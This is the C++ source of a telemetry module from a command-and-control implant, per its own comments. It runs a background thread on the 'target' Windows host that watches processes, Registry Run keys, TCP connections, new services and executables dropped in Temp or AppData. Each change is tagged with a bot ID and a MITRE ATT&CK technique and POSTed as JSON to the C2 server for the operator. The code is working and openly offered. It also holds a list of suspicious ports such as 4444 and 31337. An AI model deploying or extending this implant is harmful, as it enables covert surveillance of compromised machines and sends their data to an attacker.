/*
MIT License
Copyright (c) 2020 4B4DB4B3

Background telemetry thread — monitors target for:
  Process start/exit (with suspicious-path detection)
  Registry Run key additions/modifications
  TCP connection establishment
  Service creation
  Executable drops in Temp/AppData

Events are serialized as compact JSON and POSTed to /event on the C2 server.
g_initialized gate ensures no events fire during the first-pass state snapshot,
so the operator only sees changes that happen after the implant connects.
*/
#pragma warning(disable: 4996)

#include "Telemetry.h"
#include "C2Client.h"
#include "common.h"

#include <tlhelp32.h>
#include <iphlpapi.h>
#include <winsvc.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")

#include <string>
#include <vector>
#include <set>
#include <map>
#include <ctime>

namespace Telemetry {

// ── Module state ──────────────────────────────────────────────────────────────

static volatile bool g_running     = false;
static volatile bool g_initialized = false;  // suppresses events on first snapshot
static HANDLE        g_thread      = nullptr;
static C2Client*     g_api         = nullptr;
static int           g_bot_id      = 0;

// ── JSON / time helpers ───────────────────────────────────────────────────────

static std::string JEsc(const std::string& s) {
    std::string o;
    o.reserve(s.size());
    for (unsigned char c : s) {
        if      (c == '"')  o += "\\\"";
        else if (c == '\\') o += "\\\\";
        else if (c == '\n') o += "\\n";
        else if (c == '\r') o += "\\r";
        else if (c == '\t') o += "\\t";
        else if (c < 0x20)  {}  // drop other control chars
        else                o += (char)c;
    }
    return o;
}

static std::string NowISO() {
    time_t t; time(&t);
    struct tm tm_s; gmtime_s(&tm_s, &t);
    char buf[32]; strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%SZ", &tm_s);
    return buf;
}

// Network byte order port → host order (avoids winsock2.h dependency)
static WORD NetPort(DWORD networkOrderPort) {
    WORD w = (WORD)networkOrderPort;
    return (w >> 8) | (w << 8);
}

static std::string Ip4Str(DWORD addr) {
    return std::to_string(addr & 0xFF)        + "." +
           std::to_string((addr >> 8) & 0xFF) + "." +
           std::to_string((addr >>16) & 0xFF) + "." +
           std::to_string((addr >>24) & 0xFF);
}

// ── MITRE ATT&CK mapping table ────────────────────────────────────────────────

struct AttackEntry { const char* rule; const char* tid; const char* tname; };

static const AttackEntry ATTACK_MAP[] = {
    { "PROC_001", "T1057",     "Process Discovery"                              },
    { "PROC_002", "T1204.002", "User Execution: Malicious File"                 },
    { "PROC_003", "T1204.002", "User Execution: Malicious File"                 },
    { "REG_001",  "T1547.001", "Boot/Logon Autostart: Registry Run Keys"        },
    { "REG_002",  "T1547.001", "Boot/Logon Autostart: Registry Run Keys"        },
    { "NET_001",  "T1049",     "System Network Connections Discovery"            },
    { "NET_002",  "T1571",     "Non-Standard Port"                               },
    { "SVC_001",  "T1543.003", "Create or Modify System Process: Win Service"   },
    { "FILE_001", "T1105",     "Ingress Tool Transfer"                           },
    { nullptr, nullptr, nullptr }
};

static const AttackEntry* LookupAttack(const char* rule) {
    for (int i = 0; ATTACK_MAP[i].rule != nullptr; ++i)
        if (strcmp(ATTACK_MAP[i].rule, rule) == 0) return &ATTACK_MAP[i];
    return nullptr;
}

// ── Event emitter ─────────────────────────────────────────────────────────────

static void Emit(const char* cat, const char* type, const char* sev,
                 const char* rule, const char* evidence, const std::string& extra) {
    if (!g_initialized) return;  // suppress first-pass baseline

    std::string json =
        "{\"bot\":"   + std::to_string(g_bot_id) +
        ",\"ts\":\""  + NowISO() + "\"" +
        ",\"cat\":\"" + std::string(cat)  + "\"" +
        ",\"type\":\"" + std::string(type) + "\"" +
        ",\"sev\":\""  + std::string(sev)  + "\"" +
        ",\"rule\":\"" + std::string(rule) + "\"" +
        ",\"ev\":\""   + JEsc(evidence)    + "\"";

    const AttackEntry* atk = LookupAttack(rule);
    if (atk) {
        json += ",\"tid\":\""   + std::string(atk->tid)   + "\""
             +  ",\"tname\":\"" + std::string(atk->tname) + "\"";
    }

    json += (extra.empty() ? "" : "," + extra) + "}";

    g_api->SendEvent(json.c_str());
}

// ── Process monitor ───────────────────────────────────────────────────────────

struct ProcEntry { DWORD pid, ppid; std::string name, path; };
static std::map<DWORD, ProcEntry> g_procs;

static std::string ProcPath(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return "";
    char buf[MAX_PATH] = {}; DWORD sz = sizeof(buf) - 1;
    QueryFullProcessImageNameA(h, 0, buf, &sz);
    CloseHandle(h);
    return buf;
}

static void CheckProcesses() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    std::map<DWORD, ProcEntry> cur;
    PROCESSENTRY32 pe = {}; pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            ProcEntry e; e.pid = pe.th32ProcessID; e.ppid = pe.th32ParentProcessID;
            e.name = pe.szExeFile;
            cur[e.pid] = e;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    // New processes
    for (auto& kv : cur) {
        if (g_procs.find(kv.first) != g_procs.end()) continue;
        ProcEntry& e = kv.second;
        e.path = ProcPath(e.pid);

        std::string pl = e.path;
        for (char& c : pl) c = (char)tolower(c);

        const char *sev = "info", *rule = "PROC_001";
        std::string ev = "Process started: " + e.name;

        if (pl.find("\\temp\\") != std::string::npos ||
            pl.find("\\tmp\\")  != std::string::npos) {
            sev = "high"; rule = "PROC_002";
            ev  = "Process from TEMP: " + e.name;
        } else if (pl.find("\\appdata\\") != std::string::npos &&
                   pl.find("\\microsoft\\") == std::string::npos) {
            sev = "medium"; rule = "PROC_003";
            ev  = "Process from AppData: " + e.name;
        }

        std::string extra = "\"name\":\"" + JEsc(e.name) + "\""
            ",\"pid\":"  + std::to_string(e.pid)  +
            ",\"ppid\":" + std::to_string(e.ppid) +
            ",\"path\":\"" + JEsc(e.path) + "\"";
        Emit("process", "process_start", sev, rule, ev.c_str(), extra);
    }

    // Exited processes
    for (auto& kv : g_procs) {
        if (cur.find(kv.first) != cur.end()) continue;
        std::string extra = "\"name\":\"" + JEsc(kv.second.name) + "\""
            ",\"pid\":" + std::to_string(kv.second.pid);
        Emit("process", "process_exit", "info", "PROC_EXIT",
             ("Process exited: " + kv.second.name).c_str(), extra);
    }

    g_procs = cur;
}

// ── Registry Run key monitor ──────────────────────────────────────────────────

struct RegSnap { std::map<std::string,std::string> vals; };
static RegSnap g_reg_hklm, g_reg_hkcu;

static RegSnap SnapRunKey(HKEY root, const char* sub) {
    RegSnap s; HKEY hk;
    if (RegOpenKeyExA(root, sub, 0, KEY_READ, &hk) != ERROR_SUCCESS) return s;
    char name[256], data[1024]; DWORD i = 0, nSz, dSz, type;
    while (true) {
        nSz = sizeof(name); dSz = sizeof(data);
        if (RegEnumValueA(hk, i++, name, &nSz, 0, &type, (LPBYTE)data, &dSz) != ERROR_SUCCESS) break;
        s.vals[name] = data;
    }
    RegCloseKey(hk);
    return s;
}

static void DiffRunKey(const RegSnap& old_, const RegSnap& new_,
                       const char* hive) {
    for (auto& kv : new_.vals) {
        auto it = old_.vals.find(kv.first);
        std::string extra = "\"hive\":\"" + std::string(hive) + "\""
            ",\"value\":\"" + JEsc(kv.first) + "\""
            ",\"data\":\""  + JEsc(kv.second) + "\"";
        if (it == old_.vals.end()) {
            Emit("persistence", "registry_run_key", "high", "REG_001",
                 (std::string("New Run key [") + hive + "]: " + kv.first).c_str(), extra);
        } else if (it->second != kv.second) {
            Emit("persistence", "registry_run_modified", "medium", "REG_002",
                 (std::string("Modified Run key [") + hive + "]: " + kv.first).c_str(), extra);
        }
    }
}

static const char* REG_RUN = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

static void CheckRegistry() {
    RegSnap nh = SnapRunKey(HKEY_LOCAL_MACHINE, REG_RUN);
    RegSnap nu = SnapRunKey(HKEY_CURRENT_USER,  REG_RUN);
    DiffRunKey(g_reg_hklm, nh, "HKLM\\Run");
    DiffRunKey(g_reg_hkcu, nu, "HKCU\\Run");
    g_reg_hklm = nh;
    g_reg_hkcu = nu;
}

// ── Network monitor (established TCP connections) ─────────────────────────────

static std::set<std::string> g_conns;

static void CheckNetwork() {
    DWORD sz = 0;
    GetExtendedTcpTable(nullptr, &sz, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    std::vector<BYTE> buf(sz + 256);
    if (GetExtendedTcpTable(buf.data(), &sz, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) != NO_ERROR)
        return;

    auto* tbl = reinterpret_cast<MIB_TCPTABLE_OWNER_PID*>(buf.data());
    std::set<std::string> cur;

    for (DWORD i = 0; i < tbl->dwNumEntries; i++) {
        auto& row = tbl->table[i];
        if (row.dwState != MIB_TCP_STATE_ESTAB) continue;
        if (row.dwRemoteAddr == 0) continue;

        WORD  rPort = NetPort(row.dwRemotePort);
        std::string remote = Ip4Str(row.dwRemoteAddr) + ":" + std::to_string(rPort);
        std::string key    = remote + "@" + std::to_string(row.dwOwningPid);
        cur.insert(key);

        if (g_conns.find(key) == g_conns.end()) {
            const char *sev = "info", *rule = "NET_001";
            if (rPort == 4444 || rPort == 1337 || rPort == 8080 ||
                rPort == 9090 || rPort == 31337 || rPort == 6666) {
                sev = "medium"; rule = "NET_002";
            }
            std::string extra = "\"remote\":\"" + remote + "\""
                ",\"local_port\":"  + std::to_string(NetPort(row.dwLocalPort)) +
                ",\"pid\":"         + std::to_string(row.dwOwningPid);
            Emit("network", "tcp_connect", sev, rule,
                 ("New TCP connection: " + remote).c_str(), extra);
        }
    }
    g_conns = cur;
}

// ── Service monitor ───────────────────────────────────────────────────────────

static std::set<std::string> g_svcs;

static void CheckServices() {
    SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scm) return;

    DWORD need = 0, ret = 0;
    EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
                          nullptr, 0, &need, &ret, nullptr, nullptr);
    std::vector<BYTE> buf(need + 256);
    if (!EnumServicesStatusExA(scm, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
                               buf.data(), need, &need, &ret, nullptr, nullptr)) {
        CloseServiceHandle(scm); return;
    }

    auto* svcs = reinterpret_cast<ENUM_SERVICE_STATUS_PROCESSA*>(buf.data());
    std::set<std::string> cur;
    for (DWORD i = 0; i < ret; i++) {
        std::string name = svcs[i].lpServiceName;
        cur.insert(name);
        if (!g_svcs.empty() && g_svcs.find(name) == g_svcs.end()) {
            std::string extra = "\"service\":\"" + JEsc(name) + "\""
                ",\"display\":\"" + JEsc(svcs[i].lpDisplayName) + "\"";
            Emit("persistence", "service_created", "high", "SVC_001",
                 ("New service: " + name).c_str(), extra);
        }
    }
    CloseServiceHandle(scm);
    g_svcs = cur;
}

// ── File drop monitor (executables in Temp / AppData root) ────────────────────

static std::set<std::string> g_files;

static void ScanDir(const std::string& dir, std::set<std::string>& out) {
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA((dir + "\\*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        std::string n = fd.cFileName, nl = n;
        for (char& c : nl) c = (char)tolower(c);
        if (nl.size() > 4) {
            std::string ext = nl.substr(nl.size() - 4);
            if (ext == ".exe" || ext == ".dll" || ext == ".bat" || ext == ".ps1")
                out.insert(dir + "\\" + n);
        }
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}

static void CheckFiles() {
    char temp[MAX_PATH] = {}, appdata[MAX_PATH] = {};
    GetTempPathA(sizeof(temp), temp);
    GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));

    // Strip trailing backslash from temp path
    std::string td = temp;
    while (!td.empty() && td.back() == '\\') td.pop_back();

    std::set<std::string> cur;
    if (!td.empty())      ScanDir(td, cur);
    if (appdata[0] != 0)  ScanDir(appdata, cur);

    for (auto& f : cur) {
        if (g_files.find(f) == g_files.end()) {
            std::string extra = "\"path\":\"" + JEsc(f) + "\"";
            Emit("files", "file_dropped", "medium", "FILE_001",
                 ("Executable dropped: " + f).c_str(), extra);
        }
    }
    g_files = cur;
}

// ── Main monitoring thread ────────────────────────────────────────────────────

static DWORD WINAPI MonitorThread(LPVOID) {
    // First pass: populate state without emitting (g_initialized is false here)
    CheckProcesses();
    CheckRegistry();
    CheckNetwork();
    CheckServices();
    CheckFiles();
    g_initialized = true;   // from here on, Emit() will fire

    int tick = 0;
    while (g_running) {
        Sleep(2000);
        if (!g_running) break;
        tick++;

        CheckProcesses();   // every 2s — catch short-lived processes
        CheckNetwork();     // every 2s

        if (tick % 5 == 0) {   // every 10s — cheaper polls
            CheckRegistry();
            CheckServices();
            CheckFiles();
        }
    }
    return 0;
}

void Start(C2Client* api, int bot_id) {
    g_api     = api;
    g_bot_id  = bot_id;
    g_running = true;
    g_thread  = CreateThread(nullptr, 0, MonitorThread, nullptr, 0, nullptr);
}

void Stop() {
    g_running = false;
    if (g_thread) {
        WaitForSingleObject(g_thread, 4000);
        CloseHandle(g_thread);
        g_thread = nullptr;
    }
}

} // namespace Telemetry
